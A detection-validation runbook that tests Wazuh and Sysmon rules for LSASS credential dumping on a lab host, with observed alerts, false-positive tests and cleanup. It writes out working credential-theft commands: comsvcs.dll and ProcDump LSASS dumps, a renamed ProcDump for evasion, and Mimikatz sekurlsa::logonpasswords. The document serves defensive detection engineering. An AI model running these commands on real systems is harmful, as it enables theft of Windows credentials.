# LSASS Detection Validation Commands

## Scope and identity

Run these commands from an elevated PowerShell session on `WIN01`.

```powershell
$ExpectedHost = 'WIN01'
$Identity = [Security.Principal.WindowsIdentity]::GetCurrent()
$Principal = [Security.Principal.WindowsPrincipal]::new($Identity)
$IsAdmin = $Principal.IsInRole(
    [Security.Principal.WindowsBuiltInRole]::Administrator
)

[pscustomobject]@{
    Computer = $env:COMPUTERNAME
    Identity = $Identity.Name
    IsAdmin  = $IsAdmin
}

if ($env:COMPUTERNAME -ne $ExpectedHost) {
    throw "Wrong host: $env:COMPUTERNAME"
}
if (-not $IsAdmin) {
    throw 'Run PowerShell as Administrator.'
}
```

Expected identity for LSASS tests:

```text
WIN01\adam.wilson
```

`SIMULATION\yassine.karimi` is a normal Domain Users account. Do not use it
for these tests and do not grant it administrative rights.

## Phase 1 — `comsvcs.dll` MiniDump

Triggers process-command detection and, when not prevented, dump-file and
LSASS-access telemetry.

```powershell
$Dump = 'C:\Windows\Temp\WAZUH_LSASS_CONTROLLED.dmp'
$LsassPid = (Get-Process -Name lsass -ErrorAction Stop).Id

Remove-Item $Dump -Force -ErrorAction SilentlyContinue

rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump `
    $LsassPid $Dump full

[pscustomobject]@{
    CommandExit = $LASTEXITCODE
    DumpExists  = Test-Path $Dump
    DumpSize    = if (Test-Path $Dump) {
        (Get-Item $Dump).Length
    } else {
        0
    }
}

Remove-Item $Dump -Force -ErrorAction SilentlyContinue
'Test cleanup: ' + (-not (Test-Path $Dump))
```

Observed PASS:

```text
Security 4688 record: 17236
Wazuh rule: 100425
Level: 13
Defender events: 1116, 1117
Threat: HackTool:Win32/DumpLsass.H
```

Defender prevented this dump during the original test. Command detection still
passed.

## Phase 2 — Install and verify ProcDump

```powershell
$ProcDumpRoot = 'C:\Tools\ProcDump'
$ProcDumpZip = Join-Path $ProcDumpRoot 'Procdump.zip'
$ProcDump = Join-Path $ProcDumpRoot 'procdump64.exe'

New-Item -ItemType Directory -Path $ProcDumpRoot -Force | Out-Null

Invoke-WebRequest `
    -Uri 'https://download.sysinternals.com/files/Procdump.zip' `
    -OutFile $ProcDumpZip

Expand-Archive -Path $ProcDumpZip -DestinationPath $ProcDumpRoot -Force

Get-Item $ProcDump | Select-Object FullName, Length
Get-FileHash $ProcDump -Algorithm SHA256
Get-AuthenticodeSignature $ProcDump |
    Select-Object Status, StatusMessage, SignerCertificate
```

Expected signature status:

```text
Valid
```

## Phase 3 — ProcDump LSASS dump

```powershell
$ProcDump = 'C:\Tools\ProcDump\procdump64.exe'
$Dump = 'C:\Windows\Temp\WAZUH_PROCDUMP_CONTROLLED.dmp'

Remove-Item 'C:\Windows\Temp\WAZUH_PROCDUMP_CONTROLLED*.dmp' `
    -Force -ErrorAction SilentlyContinue

& $ProcDump -accepteula -ma lsass.exe $Dump
$ProcDumpExit = $LASTEXITCODE

Get-ChildItem 'C:\Windows\Temp\WAZUH_PROCDUMP_CONTROLLED*.dmp' `
    -ErrorAction SilentlyContinue |
    Select-Object FullName, Length, CreationTimeUtc

"ProcDump exit: $ProcDumpExit"

Remove-Item 'C:\Windows\Temp\WAZUH_PROCDUMP_CONTROLLED*.dmp' `
    -Force -ErrorAction SilentlyContinue

'Cleanup: ' + (-not [bool](
    Get-ChildItem 'C:\Windows\Temp\WAZUH_PROCDUMP_CONTROLLED*.dmp' `
        -ErrorAction SilentlyContinue
))
```

Observed PASS:

```text
Security 4688 records: 17408, 17409
Rule 100425, level 13

Sysmon Event 10 records: 3633, 3635, 3640, 3642
Rule 100420, level 12
GrantedAccess: 0x1fffff

Sysmon Event 11 records: 3634, 3641
Rule 100423, level 12
```

## Phase 4 — Renamed ProcDump

Tests whether filename evasion still produces command and behavioral telemetry.

```powershell
$Original = 'C:\Tools\ProcDump\procdump64.exe'
$Renamed = 'C:\Tools\ProcDump\svhost.exe'
$Dump = 'C:\Windows\Temp\WAZUH_RENAMED_PROCDUMP.dmp'

Remove-Item $Renamed, $Dump -Force -ErrorAction SilentlyContinue
Copy-Item $Original $Renamed -Force

Get-FileHash $Original -Algorithm SHA256
Get-FileHash $Renamed -Algorithm SHA256

& $Renamed -accepteula -ma lsass.exe $Dump
$RenamedExit = $LASTEXITCODE

[pscustomobject]@{
    CommandExit = $RenamedExit
    DumpExists  = Test-Path $Dump
    DumpSize    = if (Test-Path $Dump) {
        (Get-Item $Dump).Length
    } else {
        0
    }
}

Remove-Item $Dump, $Renamed -Force -ErrorAction SilentlyContinue

[pscustomobject]@{
    DumpRemoved    = -not (Test-Path $Dump)
    RenamedRemoved = -not (Test-Path $Renamed)
}
```

Observed PASS:

```text
Security 4688 records: 17803, 17805
Rule 100425, level 13
Process: C:\Tools\ProcDump\svhost.exe
Defender threat: HackTool:Win32/DumpLsass.E
```

Defender killed the renamed process before Sysmon Event 10/11 was generated in
the original run.

## Phase 5 — Download and verify Mimikatz

```powershell
$MimikatzRoot = 'C:\Tools\Mimikatz-Parrot'
$MimikatzZip = Join-Path $MimikatzRoot 'master.zip'
$MimikatzSource = Join-Path $MimikatzRoot 'source'

New-Item -ItemType Directory -Path $MimikatzRoot -Force | Out-Null
Remove-Item $MimikatzZip, $MimikatzSource `
    -Recurse -Force -ErrorAction SilentlyContinue

Invoke-WebRequest `
    -Uri 'https://github.com/ParrotSec/mimikatz/archive/refs/heads/master.zip' `
    -OutFile $MimikatzZip

Get-FileHash $MimikatzZip -Algorithm SHA256
Expand-Archive -Path $MimikatzZip -DestinationPath $MimikatzSource -Force

Get-ChildItem $MimikatzSource -Filter mimikatz.exe -Recurse |
    ForEach-Object {
        $Signature = Get-AuthenticodeSignature $_.FullName
        [pscustomobject]@{
            Path      = $_.FullName
            Size      = $_.Length
            SHA256    = (Get-FileHash $_.FullName -Algorithm SHA256).Hash
            Signature = $Signature.Status
        }
    }
```

Original downloaded x64 path:

```text
C:\Tools\Mimikatz-Parrot\source\mimikatz-master\x64\mimikatz.exe
```

## Phase 6 — Mimikatz LSASS access

One-shot execution without writing credential output to disk:

```powershell
$Mimikatz = `
    'C:\Tools\Mimikatz-Parrot\source\mimikatz-master\x64\mimikatz.exe'

& $Mimikatz `
    'privilege::debug' `
    'sekurlsa::logonpasswords' `
    'exit' |
    Out-Null

"Mimikatz exit: $LASTEXITCODE"
```

Interactive form used during validation:

```powershell
& 'C:\Tools\Mimikatz-Parrot\source\mimikatz-master\x64\mimikatz.exe'
```

Then enter inside the Mimikatz console:

```text
privilege::debug
sekurlsa::logonpasswords
exit
```

Observed PASS:

```text
Security 4688 records: 17965, 18001, 18022
Rule 100425, level 13

Sysmon Event 10 records: 5017, 5020, 5055
Rule 92900, level 12
GrantedAccess: 0x1010
Target: C:\Windows\system32\lsass.exe
```

## Phase 7 — Safe Sysmon Event 10 positive control

This opens an LSASS handle with `0x1010`, immediately closes it, reads no
memory, and creates no dump.

```powershell
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public static class LsassHandleProbe
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint desiredAccess,
        bool inheritHandle,
        int processId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr handle);
}
'@

$LsassPid = (Get-Process -Name lsass -ErrorAction Stop).Id
$Handle = [LsassHandleProbe]::OpenProcess(0x1010, $false, $LsassPid)

if ($Handle -eq [IntPtr]::Zero) {
    throw "OpenProcess failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}

[void][LsassHandleProbe]::CloseHandle($Handle)
'Handle opened and closed; no memory read; no dump created.'
```

Observed PASS after rule tuning:

```text
Sysmon Event 10 record: 5384
Rule 92900, level 12
GrantedAccess: 0x1010
```

## Phase 8 — Safe Event 11 dump-marker control

Creates a harmless marker file. It is not an LSASS dump.

```powershell
$Marker = 'C:\Windows\Temp\WAZUH_LSASS_RULE_TEST.dmp'

Remove-Item $Marker -Force -ErrorAction SilentlyContinue
Set-Content -Path $Marker -Value 'WAZUH LSASS Event 11 marker only'

Get-Item $Marker | Select-Object FullName, Length, CreationTimeUtc
Remove-Item $Marker -Force

'Cleanup: ' + (-not (Test-Path $Marker))
```

Observed PASS:

```text
Sysmon Event 11 record: 1489
Rule 100423, level 12
```

## Phase 9 — False-positive tests after tuning

### Benign WMI activity

```powershell
Get-CimInstance Win32_Process |
    Select-Object -First 5 |
    Out-Null
```

Observed:

```text
Sysmon Event 10 record: 5377
Source: C:\Windows\system32\wbem\wmiprvse.exe
GrantedAccess: 0x1410
Expected Wazuh result: no alert
```

### Built-in `92900` substring false positive

This opens and closes a query/synchronize handle. It performs no memory read.

```powershell
Add-Type -TypeDefinition @'
using System;
using System.Runtime.InteropServices;

public static class LsassSubstringProbe
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr OpenProcess(
        uint desiredAccess,
        bool inheritHandle,
        int processId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr handle);
}
'@

$LsassPid = (Get-Process -Name lsass -ErrorAction Stop).Id
$Handle = [LsassSubstringProbe]::OpenProcess(0x101000, $false, $LsassPid)

if ($Handle -eq [IntPtr]::Zero) {
    throw "OpenProcess failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
}

[void][LsassSubstringProbe]::CloseHandle($Handle)
'Handle opened and closed; no memory read; no dump created.'
```

Observed:

```text
Sysmon Event 10 record: 5405
GrantedAccess: 0x101000
Expected Wazuh result: no alert through suppression rule 100426
```

## Local telemetry verification

Set `$Start` immediately before each test:

```powershell
$Start = Get-Date
```

Inspect Security Event 4688:

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'Security'
    Id        = 4688
    StartTime = $Start
} | Select-Object TimeCreated, RecordId, Message
```

Inspect Sysmon Events 7, 10, and 11:

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'Microsoft-Windows-Sysmon/Operational'
    Id        = 7, 10, 11
    StartTime = $Start
} | Select-Object TimeCreated, Id, RecordId, Message
```

Inspect Defender prevention events:

```powershell
Get-WinEvent -FilterHashtable @{
    LogName   = 'Microsoft-Windows-Windows Defender/Operational'
    Id        = 1116, 1117
    StartTime = $Start
} | Select-Object TimeCreated, Id, RecordId, Message
```

## Wazuh dashboard filters

All current WIN01 telemetry:

```text
agent.id:004
```

High-confidence LSASS detections:

```text
agent.id:004 AND rule.id:(100420 OR 100421 OR 100423 OR 100424 OR 100425 OR 92900)
```

ProcDump chain:

```text
agent.id:004 AND rule.id:(100420 OR 100423 OR 100425)
```

Mimikatz chain:

```text
agent.id:004 AND rule.id:(100425 OR 92900)
```

## Final cleanup

```powershell
Remove-Item `
    'C:\Windows\Temp\WAZUH_LSASS_CONTROLLED.dmp', `
    'C:\Windows\Temp\WAZUH_PROCDUMP_CONTROLLED*.dmp', `
    'C:\Windows\Temp\WAZUH_RENAMED_PROCDUMP.dmp', `
    'C:\Windows\Temp\WAZUH_LSASS_RULE_TEST.dmp', `
    'C:\Tools\ProcDump\svhost.exe' `
    -Force -ErrorAction SilentlyContinue

Get-Process procdump64, svhost, mimikatz -ErrorAction SilentlyContinue |
    Stop-Process -Force

'Cleanup completed.'
```

## PASS matrix

| Phase | Expected rule | Result |
|---|---:|---|
| `comsvcs.dll` command | 100425 | PASS |
| ProcDump process command | 100425 | PASS |
| ProcDump LSASS access | 100420 | PASS |
| ProcDump dump creation | 100423 | PASS |
| Renamed ProcDump command | 100425 | PASS |
| Mimikatz process command | 100425 | PASS |
| Mimikatz LSASS access | 92900 | PASS |
| Safe suspicious-access control | 92900 | PASS |
| Safe dump-marker control | 100423 | PASS |
| Benign WMI false-positive test | no alert | PASS |
| `0x101000` substring false-positive test | no alert | PASS |
